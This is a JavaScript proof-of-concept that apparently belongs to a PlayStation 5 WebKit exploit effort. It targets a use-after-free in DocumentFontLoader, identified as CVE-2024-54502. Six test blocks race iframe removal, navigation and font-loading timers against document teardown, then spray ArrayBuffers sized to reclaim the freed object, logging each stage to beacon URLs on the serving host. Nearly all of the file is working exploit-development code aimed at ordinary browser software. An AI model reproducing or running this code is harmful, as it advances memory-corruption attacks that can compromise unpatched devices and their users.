// p227 — CVE-2024-54502: DocumentFontLoader::fontLoadingTimerFired re-entrancy UAF
//
// DocumentFontLoader.cpp:95-107
//   fontLoadingTimerFired() calls loadPendingFonts() then loadDone() then checkLoadComplete()
//   If document is destroyed mid-callback, m_document (a raw reference) becomes dangling
//
// DocumentFontLoader is FastMalloc (WTF_MAKE_FAST_ALLOCATED), ~80-128 bytes
// ArrayBuffer backing stores also FastMalloc (Gigacage disabled on PS5 14.20)
//
// Fixed Jan 2025, WebKit-1200 (Dec 2023) is unpatched
//
// Beacon prefix: V227-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V227-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // DocumentFontLoader size estimate: 80-128 bytes
  // Members: m_document(8) + m_fontLoadingTimer(~40-48) + m_fontsToBeginLoading(~16) + m_isFontLoadingSuspended(1) + m_isStopped(1)
  // Plus vtable/padding → ~80-128 bytes
  // Spray sizes to cover: 64, 80, 96, 112, 128, 144, 160
  var SPRAY_SIZES = [64, 80, 96, 112, 128, 144, 160];
  var SPRAY_PER_SIZE = 300;

  // ==== TEST A: iframe font load + parent removal during checkLoadComplete ====
  try {
    BS('A-START');

    var IFRAME_COUNT = 8;
    var iframes = [];

    for (var i = 0; i < IFRAME_COUNT; i++) {
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(iframe);
      iframes.push(iframe);

      var doc = iframe.contentDocument;
      doc.open();
      // The iframe document starts font loading, then the load event fires
      // During checkLoadComplete, the timer fires and loadDone may trigger
      // the iframe's load event which we catch in the parent
      doc.write('<!DOCTYPE html><html><head><style>');
      doc.write('@font-face { font-family: test' + i + '; src: local(Helvetica), local(Arial); }');
      doc.write('</style></head><body>');
      doc.write('<div style="font-family:test' + i + '">X</div>');
      doc.write('</body></html>');
      doc.close();
    }

    BS('A-IFRAMES-' + iframes.length);

    // Let the font loading timers start (they fire at 0ms)
    // Then immediately remove iframes — race with the timer
    setTimeout(function() {
      BS('A-REMOVING');

      // Remove all iframes rapidly
      for (var i = 0; i < iframes.length; i++) {
        if (iframes[i].parentNode) {
          iframes[i].parentNode.removeChild(iframes[i]);
        }
      }
      BS('A-REMOVED');

      // Spray to reclaim freed DocumentFontLoader memory
      var spray = [];
      for (var si = 0; si < SPRAY_SIZES.length; si++) {
        for (var s = 0; s < SPRAY_PER_SIZE; s++) {
          var ab = new ArrayBuffer(SPRAY_SIZES[si]);
          var view = new Uint32Array(ab);
          for (var k = 0; k < view.length; k++) {
            view[k] = 0xA0A00000 | ((si << 12) | (k & 0xFFF));
          }
          spray.push(ab);
        }
      }
      BS('A-SPRAYED-' + spray.length);

      // Force GC and layout
      for (var gc = 0; gc < 100; gc++) {
        var tmp = new ArrayBuffer(1024 * 1024);
      }
      document.body.offsetHeight;
      BS('A-SURVIVED');
      spray = null;
    }, 0);
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST B: iframe removal during font load callback ====
  try {
    BS('B-START');

    var bIframe = document.createElement('iframe');
    bIframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

    // When iframe loads, its fontLoadingTimer will fire soon after
    bIframe.onload = function() {
      BS('B-IFRAME-LOAD');

      // The fontLoadingTimerFired is 0ms timer — fires next tick
      // Remove iframe immediately — races with timer
      setTimeout(function() {
        if (bIframe.parentNode) {
          bIframe.parentNode.removeChild(bIframe);
          BS('B-REMOVED');
        }

        // Spray
        var bSpray = [];
        for (var si = 0; si < SPRAY_SIZES.length; si++) {
          for (var s = 0; s < SPRAY_PER_SIZE; s++) {
            var ab = new ArrayBuffer(SPRAY_SIZES[si]);
            var view = new Uint32Array(ab);
            for (var k = 0; k < view.length; k++) {
              view[k] = 0xB0B00000 | ((si << 12) | (k & 0xFFF));
            }
            bSpray.push(ab);
          }
        }
        BS('B-SPRAYED-' + bSpray.length);
        BS('B-SURVIVED');
        bSpray = null;
      }, 0);
    };

    document.body.appendChild(bIframe);
    var bDoc = bIframe.contentDocument;
    bDoc.open();
    bDoc.write('<!DOCTYPE html><html><head>');
    // Multiple @font-face rules to increase font loading activity
    for (var f = 0; f < 20; f++) {
      bDoc.write('<style>@font-face { font-family: bf' + f + '; src: local(Helvetica), local(Arial), local(Times); }</style>');
    }
    bDoc.write('</head><body>');
    for (var f = 0; f < 20; f++) {
      bDoc.write('<span style="font-family:bf' + f + '">Font' + f + '</span>');
    }
    bDoc.write('</body></html>');
    bDoc.close();
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST C: Navigation-based trigger — iframe navigates away during fontLoadingTimerFired ====
  try {
    BS('C-START');

    var cIframe = document.createElement('iframe');
    cIframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(cIframe);

    var cDoc = cIframe.contentDocument;
    cDoc.open();
    cDoc.write('<!DOCTYPE html><html><head>');
    // Font loading + script that navigates after font timer fires
    cDoc.write('<style>@font-face { font-family: cfont; src: local(Helvetica); }</style>');
    cDoc.write('</head><body style="font-family:cfont">');
    cDoc.write('<script>');
    // The font loading timer fires after the script runs
    // checkLoadComplete inside fontLoadingTimerFired might detect load is complete
    // If we navigate at just the right moment, Document is destroyed
    cDoc.write('setTimeout(function() {');
    cDoc.write('  try { parent.postMessage("C-TIMER", "*"); } catch(e){}');
    cDoc.write('  location.href = "about:blank";');
    cDoc.write('}, 0);');
    cDoc.write('<\/script>');
    cDoc.write('</body></html>');
    cDoc.close();

    window.addEventListener('message', function cHandler(ev) {
      if (ev.data === 'C-TIMER') {
        BS('C-NAV-MSG');
        window.removeEventListener('message', cHandler);

        // The iframe navigated — old document might be mid-destruction
        // Spray immediately
        setTimeout(function() {
          var cSpray = [];
          for (var si = 0; si < SPRAY_SIZES.length; si++) {
            for (var s = 0; s < SPRAY_PER_SIZE; s++) {
              var ab = new ArrayBuffer(SPRAY_SIZES[si]);
              var view = new Uint32Array(ab);
              for (var k = 0; k < view.length; k++) {
                view[k] = 0xC0C00000 | ((si << 12) | (k & 0xFFF));
              }
              cSpray.push(ab);
            }
          }
          BS('C-SPRAYED-' + cSpray.length);
          BS('C-SURVIVED');

          if (cIframe.parentNode) cIframe.parentNode.removeChild(cIframe);
          cSpray = null;
        }, 5);
      }
    });
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST D: FontFace API — programmatic load + rapid document destruction ====
  try {
    BS('D-START');

    var dCount = 16;
    var dIframes = [];

    for (var di = 0; di < dCount; di++) {
      var dif = document.createElement('iframe');
      dif.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(dif);
      dIframes.push(dif);

      var dd = dif.contentDocument;
      dd.open();
      dd.write('<!DOCTYPE html><html><head></head><body>');
      dd.write('<script>');
      // Use FontFace constructor API + load to trigger beginLoadingFontSoon
      dd.write('try {');
      dd.write('  var f = new FontFace("df' + di + '", "local(Helvetica)");');
      dd.write('  document.fonts.add(f);');
      dd.write('  f.load();');
      dd.write('  document.fonts.load("1em df' + di + '", "X");');
      dd.write('} catch(e) {}');
      dd.write('<\/script>');
      dd.write('</body></html>');
      dd.close();
    }

    BS('D-IFRAMES-' + dIframes.length);

    // Remove all iframes synchronously, then again with setTimeout(0) for timing variance
    setTimeout(function() {
      // First batch: remove half
      for (var i = 0; i < dCount / 2; i++) {
        if (dIframes[i].parentNode) dIframes[i].parentNode.removeChild(dIframes[i]);
      }
      BS('D-HALF-REMOVED');

      // Second batch on next tick (races with remaining timers)
      setTimeout(function() {
        for (var i = dCount / 2; i < dCount; i++) {
          if (dIframes[i].parentNode) dIframes[i].parentNode.removeChild(dIframes[i]);
        }
        BS('D-ALL-REMOVED');

        // Spray
        var dSpray = [];
        for (var si = 0; si < SPRAY_SIZES.length; si++) {
          for (var s = 0; s < SPRAY_PER_SIZE; s++) {
            var ab = new ArrayBuffer(SPRAY_SIZES[si]);
            var view = new Uint32Array(ab);
            for (var k = 0; k < view.length; k++) {
              view[k] = 0xD0D00000 | ((si << 12) | (k & 0xFFF));
            }
            dSpray.push(ab);
          }
        }
        BS('D-SPRAYED-' + dSpray.length);
        BS('D-SURVIVED');
        dSpray = null;
      }, 0);
    }, 0);
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST E: Suspend/Resume race — trigger suspendFontLoading then resumeFontLoading rapidly ====
  try {
    BS('E-START');

    // content-visibility: auto can suspend/resume font loading
    var eContainer = document.createElement('div');
    eContainer.style.cssText = 'height:200px;overflow:auto;';
    document.body.appendChild(eContainer);

    // Create tall content to push the font element out of view
    var eSpacer = document.createElement('div');
    eSpacer.style.cssText = 'height:5000px;';
    eContainer.appendChild(eSpacer);

    var eFontDiv = document.createElement('div');
    var supportsCV = CSS.supports && CSS.supports('content-visibility', 'auto');
    if (supportsCV) {
      eFontDiv.style.cssText = 'content-visibility:auto;contain-intrinsic-size:auto 100px;';
    }
    eContainer.appendChild(eFontDiv);

    // Add @font-face reference in the content-visibility:auto section
    var eStyle = document.createElement('style');
    eStyle.textContent = '@font-face { font-family: efont; src: local(Helvetica), local(Arial); }';
    document.head.appendChild(eStyle);
    eFontDiv.innerHTML = '<span style="font-family:efont">Hidden font content</span>';

    document.body.offsetHeight;
    BS('E-SETUP-CV-' + supportsCV);

    if (supportsCV) {
      // Rapidly scroll in and out — triggers suspend/resume of font loading
      // This creates a race between suspendFontLoading and fontLoadingTimerFired
      var eScrollCount = 0;
      function eScroll() {
        if (eScrollCount >= 20) {
          BS('E-SCROLLS-DONE');
          document.body.removeChild(eContainer);
          eStyle.remove();
          return;
        }
        eScrollCount++;
        // Scroll to bottom (font section visible → resume)
        eContainer.scrollTop = eContainer.scrollHeight;
        document.body.offsetHeight;

        // Immediately scroll to top (font section hidden → suspend)
        eContainer.scrollTop = 0;
        document.body.offsetHeight;

        setTimeout(eScroll, 0);
      }
      eScroll();
    } else {
      BS('E-SKIP-NO-CV');
      document.body.removeChild(eContainer);
      eStyle.remove();
    }
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  // ==== TEST F: Multiple font loads in rapid succession + GC pressure ====
  try {
    BS('F-START');

    var fIframes = [];
    var WAVES = 5;
    var PER_WAVE = 4;
    var fWave = 0;

    function fNextWave() {
      if (fWave >= WAVES) {
        BS('F-DONE-W' + fWave);
        return;
      }
      fWave++;
      BS('F-WAVE-' + fWave);

      // Create iframes with font loading
      var wave = [];
      for (var i = 0; i < PER_WAVE; i++) {
        var fif = document.createElement('iframe');
        fif.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
        document.body.appendChild(fif);
        wave.push(fif);

        var fd = fif.contentDocument;
        fd.open();
        fd.write('<!DOCTYPE html><html><head>');
        fd.write('<style>@font-face { font-family: wf' + fWave + '_' + i + '; src: local(Courier), local(monospace); }</style>');
        fd.write('</head><body style="font-family:wf' + fWave + '_' + i + '">W' + fWave + '</body></html>');
        fd.close();
      }

      // Immediately remove + spray
      setTimeout(function() {
        for (var i = 0; i < wave.length; i++) {
          if (wave[i].parentNode) wave[i].parentNode.removeChild(wave[i]);
        }

        // GC pressure + spray
        var fSpray = [];
        for (var s = 0; s < 500; s++) {
          var ab = new ArrayBuffer(112);
          var v = new Uint32Array(ab);
          for (var k = 0; k < v.length; k++) {
            v[k] = 0xF0F00000 | ((fWave << 12) | (k & 0xFFF));
          }
          fSpray.push(ab);
        }

        // GC pressure
        for (var g = 0; g < 50; g++) {
          new ArrayBuffer(1024 * 1024);
        }
        BS('F-W' + fWave + '-SPRAY');

        fSpray = null;
        setTimeout(fNextWave, 10);
      }, 0);
    }
    fNextWave();
  } catch (e) {
    BS('F-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
